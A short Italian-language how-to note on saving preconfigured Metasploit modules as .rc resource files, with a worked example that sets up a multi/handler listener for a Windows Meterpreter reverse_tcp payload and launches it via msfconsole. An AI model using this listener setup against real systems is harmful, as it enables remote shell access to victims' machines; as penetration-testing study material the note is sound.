E’ possibile avviare dei moduli preconfigurati da noi su metasploit,ci sono 2 modi:

- Copiando un modulo che stiamo utilizzando su msfconsole
    - `makerc /PATH` salva il modulo con le opzioni da noi inserite per poterlo avviare preconfigurato
- Creando un file nano con estensione .rc

ESEMPIO PER HANDLER

1. `nano handler.rc` creiamo il file da compilare
    1. **use multi/handler**
    2. **set PAYLOAD windows/meterpreter/reverse_tcp** importante il CAPS
    3. **set LHOST** mio IP
    4. **se LPORT** porta di ascolto
    5. **run**
2. `msfconsole -r PATH/handler.rc` per far partire il nostro modulo direttamente da console senza aver avviato msfconsole
3. `resource PATH/handler.rc` avviare modulo preconfigurato con msfconsole avviato
